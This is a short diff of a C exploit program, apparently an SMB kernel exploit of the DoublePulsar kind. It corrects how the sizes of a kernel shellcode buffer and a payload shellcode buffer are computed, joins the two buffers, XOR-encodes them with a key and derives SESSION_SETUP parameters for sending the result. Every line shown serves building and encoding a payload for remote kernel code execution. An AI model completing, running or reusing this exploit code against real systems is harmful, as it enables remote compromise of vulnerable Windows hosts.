@@ -266,8 +266,10 @@ int main(int argc, char* argv[])
 	"\x90\x90\x90\x90\x90\x90\x90\x90";
 	
 	//might need to make this static due to sizeof being garbage @ counting shellcode
-	unsigned int EntireShellcodeSize = sizeof(kernel_shellcode)/sizeof(shellcode[0]);
-	
+	unsigned int kernel_shellcode_size = sizeof(kernel_shellcode)/sizeof(kernel_shellcode[0]);
+	unsigned int payload_shellcode_size = sizeof(shellcode)/sizeof(shellcode[0]);
+	unsigned int EntireShellcodeSize = kernel_shellcode_size + payload_shellcode_size;
+		
 	//generate the SESSION_SETUP parameters here
 	unsigned int TotalSizeOfPayload = EntireShellcodeSize ^ XorKey;
 	unsigned int ChunkSize = 4096 ^ XorKey;
@@ -281,10 +283,10 @@ int main(int argc, char* argv[])
 	memset(encrypted, 0x00, 4096);
 	
 	//copy kernel shellcode to encrypted buffer
-	memcpy(encrypted, kernel_shellcode, sizeof(kernel_shellcode));
+	memcpy(encrypted, kernel_shellcode, kernel_shellcode_size);
 
 	//copy payload shellcode to encrypted buffer
-	memcpy(encrypted + sizeof(kernel_shellcode),shellcode, sizeof(shellcode));
+	memcpy(encrypted + kernel_shellcode_size, shellcode, payload_shellcode_size);
 
 	//Xor the data buffer with the calculated key
 	xor_payload(XorKey, encrypted, 4096);
